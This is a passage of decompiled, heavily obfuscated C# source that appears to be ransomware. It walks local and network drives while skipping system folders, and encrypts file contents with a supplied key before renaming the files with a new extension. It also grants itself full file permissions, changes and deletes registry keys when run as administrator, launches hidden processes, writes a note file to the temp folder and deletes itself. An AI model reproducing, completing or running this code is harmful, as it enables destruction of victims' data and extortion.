				if (XtQtDAAqcssaA)
				{
					try
					{
						File.AppendAllText(IuaKWfBuBpJ, getString_0(107385662) + ex6.Message + getString_0(107395755));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (!string.IsNullOrEmpty(tgEjSEnjUdT))
		{
			try
			{
				File.Delete(tgEjSEnjUdT);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396321))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396321)));
			}
		}
		catch (Exception ex11)
		{
			try
			{
				File.AppendAllText(IuaKWfBuBpJ, getString_0(107385641) + ex11.Message);
			}
			catch (Exception)
			{
			}
		}
		if (XtQtDAAqcssaA)
		{
			try
			{
				File.AppendAllText(IuaKWfBuBpJ, getString_0(107385564));
			}
			catch (Exception)
			{
			}
		}
		if (wZViDAUBvyJWckg == getString_0(107385583))
		{
			oUCKpBBKSBqKN();
		}
	}

	public static void WpIfUsWFlaoV()
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(VzYMPTFsHuw(tQZMOZqkYus(getString_0(107385542))), VzYMPTFsHuw(getString_0(107385932)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int qLyAElQZQzbLir(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> rvkJwXPNOYzzrb(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if ((text.Contains(getString_0(107385903)) || text.Contains(getString_0(107385878)) || text.Contains(getString_0(107385845)) || text.ToLower().Contains(getString_0(107385796)) || text.ToLower().Contains(getString_0(107385815)) || text.Contains(getString_0(107385758)) || text.Contains(getString_0(107385769)) || text.ToLower().Contains(getString_0(107385724)) || text.ToLower().Contains(getString_0(107385743)) || text.ToLower().Contains(getString_0(107385194)) || text.ToLower().Contains(getString_0(107385153)) || text.ToLower().Contains(getString_0(107385168)) || text.ToLower().Contains(getString_0(107385123)) || text.ToLower().Contains(getString_0(107385142)) || text.ToLower().Contains(getString_0(107385089))) && !text.Contains(VzYMPTFsHuw(getString_0(107385096))))
				{
					continue;
				}
				array = Directory.GetFiles(text);
				goto IL_0210;
			}
			catch
			{
			}
			continue;
			IL_0210:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107385023)) && !fileInfo.FullName.Contains(getString_0(107385038)) && !fileInfo.FullName.Contains(getString_0(107384989)) && !fileInfo.FullName.Contains(getString_0(107385004)) && !fileInfo.FullName.Contains(getString_0(107384955)) && !fileInfo.FullName.Contains(getString_0(107384970)) && !fileInfo.FullName.Contains(getString_0(107385433)) && !fileInfo.FullName.Contains(getString_0(107385448)) && !fileInfo.FullName.Contains(getString_0(107385403)) && !fileInfo.FullName.Contains(getString_0(107385382)) && !fileInfo.FullName.ToLower().Contains(getString_0(107385369)) && !fileInfo.FullName.ToLower().Contains(getString_0(107385388)) && !fileInfo.FullName.ToLower().Contains(getString_0(107385339)) && !fileInfo.FullName.ToLower().Contains(getString_0(107385354)) && !fileInfo.FullName.Contains(VzYMPTFsHuw(getString_0(107385305))) && !fileInfo.FullName.Contains(getString_0(107385280)) && !fileInfo.FullName.Contains(getString_0(107396321)) && !fileInfo.FullName.Contains(getString_0(107385299)) && !fileInfo.FullName.EndsWith(getString_0(107394902)) && !fileInfo.FullName.EndsWith(getString_0(107385250)) && !fileInfo.FullName.EndsWith(getString_0(107385245)) && !fileInfo.FullName.EndsWith(getString_0(107385240)) && !fileInfo.FullName.EndsWith(getString_0(107385267)) && !fileInfo.FullName.Contains(getString_0(107385262)) && !fileInfo.FullName.Contains(PYZhiSywDob) && !fileInfo.FullName.Contains(IuaKWfBuBpJ) && !fileInfo.FullName.Contains(NBDdFqpqnBRofW))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(YsIgwUYIkhJk) * 1024.0 * 1024.0 && MIxirqlACCH == getString_0(107396830))
						{
							list.Add(fileInfo.FullName);
							nwKTzgMtauxST(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && MIxirqlACCH == getString_0(107396725))
						{
							list.Add(fileInfo.FullName);
							nwKTzgMtauxST(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			array2 = directories;
			foreach (string item in array2)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void IQdJQPJIVJIj()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107385213));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!UnsVNkGvmiq.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107384680), getString_0(107396752)).Replace(getString_0(107384643), getString_0(107384680))
					.Replace(getString_0(107384634), getString_0(107386328))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					UnsVNkGvmiq.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107384680), getString_0(107396752)).Replace(getString_0(107384643), getString_0(107384680))
						.Replace(getString_0(107384634), getString_0(107386328))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107384661), getString_0(107386328)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string gzgGVgooFWELQWZ(string YawvTcBmbdVdUn = "", string sIITCWEeGR = "")
	{
		string result = getString_0(107386328);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = YawvTcBmbdVdUn,
				Arguments = sIITCWEeGR,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
		}
		catch
		{
		}
		return result;
	}

	public static void tIqyjNWBfPKQE(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107384652),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string tQZMOZqkYus(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string VzYMPTFsHuw(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void oYaejXZViJDyn()
	{
		//IL_0275: Unknown result type (might be due to invalid IL or missing references)
		//IL_027c: Expected O, but got Unknown
		//IL_029e: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a5: Expected O, but got Unknown
		mYgzHncPVUqL();
		List<njaOuMsdeCrA> list = njaOuMsdeCrA.ZTbyjphsAnBq();
		foreach (njaOuMsdeCrA item in list)
		{
			LwKYIqEXuWxMEvK.Add(item.IPAddress);
		}
		List<string> lwKYIqEXuWxMEvK = LwKYIqEXuWxMEvK;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b = delegate(string string_0)
			{
				LdjHjnvKojp CS_0024_003C_003E8__locals0 = new LdjHjnvKojp();
				CS_0024_003C_003E8__locals0.dRGYTxVjrZ = string_0;
				if ((CS_0024_003C_003E8__locals0.dRGYTxVjrZ.StartsWith(getString_0(107382747)) || CS_0024_003C_003E8__locals0.dRGYTxVjrZ.StartsWith(getString_0(107382774)) || CS_0024_003C_003E8__locals0.dRGYTxVjrZ.StartsWith(getString_0(107382765)) || CS_0024_003C_003E8__locals0.dRGYTxVjrZ.StartsWith(getString_0(107386328))) && vUKwidQPcZK.SVqnxxkNCtz(CS_0024_003C_003E8__locals0.dRGYTxVjrZ))
				{
					try
					{
						Thread.Sleep(PtQKcSkXgtK);
						UnsVNkGvmiq.Add(getString_0(107384680) + CS_0024_003C_003E8__locals0.dRGYTxVjrZ + getString_0(107382720));
						try
						{
							if (vgTZYvMerotpU)
							{
								Console.WriteLine(getString_0(107384680) + CS_0024_003C_003E8__locals0.dRGYTxVjrZ + getString_0(107382720));
							}
						}
						catch
						{
						}
						Parallel.For(68, 91, delegate(int int_0)
						{
							Thread.Sleep(PtQKcSkXgtK);
							UnsVNkGvmiq.Add(LdjHjnvKojp.getString_0(107384686) + CS_0024_003C_003E8__locals0.dRGYTxVjrZ + LdjHjnvKojp.getString_0(107396758) + (char)int_0 + LdjHjnvKojp.getString_0(107400240));
							try
							{
								if (vgTZYvMerotpU)
								{
									Console.WriteLine(LdjHjnvKojp.getString_0(107384686) + CS_0024_003C_003E8__locals0.dRGYTxVjrZ + LdjHjnvKojp.getString_0(107396758) + (char)int_0 + LdjHjnvKojp.getString_0(107400240));
								}
							}
							catch
							{
							}
						});
					}
					catch
					{
					}
				}
			};
		}
		Parallel.ForEach(lwKYIqEXuWxMEvK, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b);
		try
		{
			vUKwidQPcZK.TrJvYsiAqEyJ trJvYsiAqEyJ = new vUKwidQPcZK.TrJvYsiAqEyJ(vUKwidQPcZK.ccPirCGsjtVXZp.TpzRPnNZFLd, vUKwidQPcZK.awGrdKNwNanbmSH.FBBAoZmlzRSPx, vUKwidQPcZK.ashGsiOgDjRyIh.GwleDOZbJfwqnOc, vUKwidQPcZK.yQgXtcLfnmXXOsz.SAyAYQFhUUH);
			foreach (string item2 in trJvYsiAqEyJ)
			{
				MatchCollection matchCollection = Regex.Matches(item2, getString_0(107384603));
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!UnsVNkGvmiq.Contains(item3.ToString()))
						{
							UnsVNkGvmiq.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (vgTZYvMerotpU)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		JRQhIFSQAQJOt.ennmRqubOUoPd();
		try
		{
			if (vgTZYvMerotpU)
			{
				Console.WriteLine(getString_0(107384554));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = tQZMOZqkYus(getString_0(107384481));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(VzYMPTFsHuw(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(VzYMPTFsHuw(getString_0(107384888)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(VzYMPTFsHuw(getString_0(107384831)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (ybLkXQhPvGkZaed == getString_0(107396830))
		{
			yxuAcsDUPCh.zzEETqbmpTBbHvp();
		}
		try
		{
			if (vgTZYvMerotpU)
			{
				Console.WriteLine(getString_0(107384818));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107385213));
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (UnsVNkGvmiq.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107384680), getString_0(107396752)).Replace(getString_0(107384643), getString_0(107384680))
					.Replace(getString_0(107384634), getString_0(107386328))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (vgTZYvMerotpU)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107384680), getString_0(107396752)).Replace(getString_0(107384643), getString_0(107384680))
							.Replace(getString_0(107384634), getString_0(107386328))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107384661), getString_0(107386328)));
					}
				}
				catch
				{
				}
				UnsVNkGvmiq.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107384680), getString_0(107396752)).Replace(getString_0(107384643), getString_0(107384680))
					.Replace(getString_0(107384634), getString_0(107386328))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107384661), getString_0(107386328)));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (vgTZYvMerotpU)
			{
				Console.WriteLine(getString_0(107384729));
			}
		}
		catch
		{
		}
	}

	public static void RTrKmYslaoZrDdzW(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = VzYMPTFsHuw(getString_0(107384180));
		processStartInfo.Arguments = getString_0(107384151) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool bCzvlqPWbSFdYG(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void NLXNIAFZUBNL()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = tQZMOZqkYus(getString_0(107384146));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(VzYMPTFsHuw(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(VzYMPTFsHuw(getString_0(107384008)));
					registryKey.DeleteSubKey(VzYMPTFsHuw(getString_0(107383983)));
					registryKey.DeleteSubKey(VzYMPTFsHuw(getString_0(107383934)));
					registryKey.DeleteSubKey(VzYMPTFsHuw(getString_0(107384421)));
					registryKey.DeleteSubKey(VzYMPTFsHuw(getString_0(107384180)));
					registryKey.DeleteSubKey(VzYMPTFsHuw(getString_0(107384428)));
					registryKey.DeleteSubKey(VzYMPTFsHuw(getString_0(107384399)));
					registryKey.Close();
				}
				string_ = tQZMOZqkYus(getString_0(107384350));
				registryKey = Registry.LocalMachine.OpenSubKey(VzYMPTFsHuw(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(VzYMPTFsHuw(getString_0(107384253)));
					registryKey.Close();
				}
				string_ = tQZMOZqkYus(getString_0(107384268));
				registryKey = Registry.LocalMachine.OpenSubKey(VzYMPTFsHuw(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(VzYMPTFsHuw(getString_0(107384253)));
					registryKey.Close();
				}
				string_ = tQZMOZqkYus(getString_0(107384268));
				registryKey = Registry.CurrentUser.OpenSubKey(VzYMPTFsHuw(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(VzYMPTFsHuw(getString_0(107384253)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107384219)), VzYMPTFsHuw(getString_0(107384234)));
			gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107383641)), VzYMPTFsHuw(tQZMOZqkYus(getString_0(107383664))));
			gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107383641)), VzYMPTFsHuw(getString_0(107383486)));
			gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107383425)), VzYMPTFsHuw(getString_0(107383440)));
		}
		catch
		{
		}
	}

	public static void mkjUeNwAcldzu(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(VzYMPTFsHuw(getString_0(107383847)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void DjOAlDtiFJsu()
	{
		string string_ = tQZMOZqkYus(getString_0(107383854));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(VzYMPTFsHuw(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(VzYMPTFsHuw(getString_0(107383741)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void mYgzHncPVUqL()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107383708)), VzYMPTFsHuw(getString_0(107383727)));
			gzgGVgooFWELQWZ(VzYMPTFsHuw(getString_0(107383708)), VzYMPTFsHuw(getString_0(107383085)));
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string sOCOEUvRMWJit(string EuKGrcMtrVqeVo, int gYNhprTJCex = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(gYNhprTJCex);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(EuKGrcMtrVqeVo, 1, intPtr, ref gYNhprTJCex) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void oUCKpBBKSBqKN()
	{
		gzgGVgooFWELQWZ(getString_0(107396486), VzYMPTFsHuw(getString_0(107382907)));
		string text = VzYMPTFsHuw(getString_0(107383225));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107384634) + text + getString_0(107384634) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396486);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void qutpUeZZrAG(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (XtQtDAAqcssaA)
			{
				try
				{
					File.AppendAllText(IuaKWfBuBpJ, getString_0(107383160) + string_0 + getString_0(107383183) + ex.Message + getString_0(107395755));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string uGgsLnwioPEKG()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107386328);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107382582);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107382605))) ? getString_0(107382555) : getString_0(107382564));
				break;
			case 0:
				text = getString_0(107382610);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107382577);
				break;
			case 4:
				text = getString_0(107382532);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107382546) : getString_0(107382523));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107382490) : getString_0(107382495)) : getString_0(107382500)) : getString_0(107382541));
				break;
			case 10:
				text = getString_0(107382517);
				break;
			}
		}
		if (text != getString_0(107386328))
		{
			text = getString_0(107382512) + text;
			if (oSVersion.ServicePack != getString_0(107386328))
			{
				text = text + getString_0(107382467) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string vLEIkxjZfsc(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107394808);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(VzYMPTFsHuw(getString_0(107394783)));
				streamWriter.WriteLine(getString_0(107395755));
				streamWriter.WriteLine(VzYMPTFsHuw(getString_0(107394417)));
				streamWriter.WriteLine(string_0);
				if (MNVRxjtsYUxy)
				{
					streamWriter.WriteLine(getString_0(107395755));
					streamWriter.WriteLine(VzYMPTFsHuw(getString_0(107394323)));
					streamWriter.WriteLine(chuLHDnVuoGm.CcLbwvTyIfmg());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !VSeBsFuIKiNqF)
				{
					File.AppendAllText(text, getString_0(107394290) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (XtQtDAAqcssaA)
			{
				try
				{
					File.AppendAllText(IuaKWfBuBpJ, getString_0(107382462) + ex.Message + getString_0(107395755));
				}
				catch (Exception)
				{
				}
			}
		}
		return text;
	}

	private static void ebeKUKwKqklcMA(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		JRNxOCaXBv.GWxLXRYTXtf CS_0024_003C_003E8__locals0 = new JRNxOCaXBv();
		CS_0024_003C_003E8__locals0.RFZBgYpIbPnq = string_1;
		CS_0024_003C_003E8__locals0.AVhdNmhHLkw = string_2;
		CS_0024_003C_003E8__locals0.hnzMMdLcyXg = string_3;
		CS_0024_003C_003E8__locals0.oXYPGbgDNUb = string_4;
		LGcIAPIHUXZNO = Convert.FromBase64String(CS_0024_003C_003E8__locals0.hnzMMdLcyXg);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395971))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = sOCOEUvRMWJit(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !UnsVNkGvmiq.Contains(text))
							{
								UnsVNkGvmiq.Add(text);
							}
							else if (!UnsVNkGvmiq.Contains(array[i].Name))
							{
								UnsVNkGvmiq.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!UnsVNkGvmiq.Contains(array[i].Name))
							{
								UnsVNkGvmiq.Add(array[i].Name);
							}
						}
					}
					else if (!UnsVNkGvmiq.Contains(array[i].Name))
					{
						UnsVNkGvmiq.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int i = 0; i < string_0.Length; i++)
			{
				if (!UnsVNkGvmiq.Contains(string_0[i]))
				{
					UnsVNkGvmiq.Add(string_0[i]);
				}
			}
		}
		if (UnsVNkGvmiq.Contains(VzYMPTFsHuw(getString_0(107382405))) && RyZMxmbkHOIZd == getString_0(107396830))
		{
			UnsVNkGvmiq.Remove(VzYMPTFsHuw(getString_0(107382405)));
		}
		Parallel.ForEach(UnsVNkGvmiq, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new JRNxOCaXBv.GWxLXRYTXtf();
			CS_0024_003C_003E8__locals0.BvsuvyFlecPx = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.zCOMAcLqEnWzTo = string_0;
			if (BrcuPGYukd && !uGgsLnwioPEKG().Contains(JRNxOCaXBv.getString_0(107382557)) && !uGgsLnwioPEKG().Contains(JRNxOCaXBv.getString_0(107400208)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						bCzvlqPWbSFdYG(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.zCOMAcLqEnWzTo);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (nAhrhGGnjLvL == JRNxOCaXBv.getString_0(107396841))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					xWYfnlpQmptOgS(CS_0024_003C_003E8__locals0.zCOMAcLqEnWzTo, CS_0024_003C_003E8__locals0.BvsuvyFlecPx.RFZBgYpIbPnq, CS_0024_003C_003E8__locals0.BvsuvyFlecPx.oXYPGbgDNUb, CS_0024_003C_003E8__locals0.BvsuvyFlecPx.AVhdNmhHLkw, CS_0024_003C_003E8__locals0.BvsuvyFlecPx.hnzMMdLcyXg);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				xWYfnlpQmptOgS(CS_0024_003C_003E8__locals0.zCOMAcLqEnWzTo, CS_0024_003C_003E8__locals0.RFZBgYpIbPnq, CS_0024_003C_003E8__locals0.oXYPGbgDNUb, CS_0024_003C_003E8__locals0.AVhdNmhHLkw, CS_0024_003C_003E8__locals0.hnzMMdLcyXg);
			}
		});
	}

	public static void xWYfnlpQmptOgS(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107386328));
		List<string> list3 = list2;
		if (AsHJUQfrCAxHnEB == getString_0(107396725))
		{
			list = rvkJwXPNOYzzrb(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = YxIMZImbGZbj.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_03e4;
					}
				}
				if ((aKVrenHUiYNV == getString_0(107396725) && !item.EndsWith(text)) || aacDzVOnoKU.Contains(item))
				{
					continue;
				}
				if (nUcCUJIepUVWBM == getString_0(107396830))
				{
					try
					{
						if (xhISZmOqgVfP.SyQDXJZMiVcpJ(item))
						{
							xhISZmOqgVfP.TyPIvAqBtcBzN(item);
						}
					}
					catch
					{
					}
				}
				aacDzVOnoKU.Add(item);
				if (!DhgHRwHTnLl.Contains(Path.GetDirectoryName(item)))
				{
					DhgHRwHTnLl.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (yKirRorQtiUWa == getString_0(107396830) && fileStream.Length > Convert.ToInt32(OLieTsrCJKKkG) * 1024 * 1024 && !list3.Contains(text))
					{
						if (OULbCWoifC == getString_0(107396830))
						{
							foreach (string item2 in QrfGnpJnAuCjH)
							{
								if (item.ToLower().EndsWith(item2) && cfLqyLJDABPGnW == getString_0(107396830))
								{
									if (Convert.ToInt32(IAXzEIcMsJCbe) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											chuLHDnVuoGm.XEbKwrzWPjZipB(getString_0(107386441), getString_0(107386404), getString_0(107386423), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && cfLqyLJDABPGnW == getString_0(107396725))
								{
									try
									{
										chuLHDnVuoGm.XEbKwrzWPjZipB(getString_0(107386441), getString_0(107386404), getString_0(107386423), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = nTOXQbVewSXTFiv.zyRLkdiKoM(item, Convert.ToInt32(OLieTsrCJKKkG) * 1024 * 1024);
						byte[] qvpNQzoNrMBw = nTOXQbVewSXTFiv.LFBNnGzEowO(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						nTOXQbVewSXTFiv.nzAnvDfCOCtBIgh(item, qvpNQzoNrMBw);
						if (string_2 != getString_0(107382396))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107382396))
					{
						dEBoJFJUsggx(item, item + string_2, LGcIAPIHUXZNO);
					}
					else
					{
						dEBoJFJUsggx(item, item + getString_0(107382423), LGcIAPIHUXZNO);
					}
				}
				catch (Exception)
				{
				}
				IL_03e4:;
			}
		}
	}

	public static void nwKTzgMtauxST(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
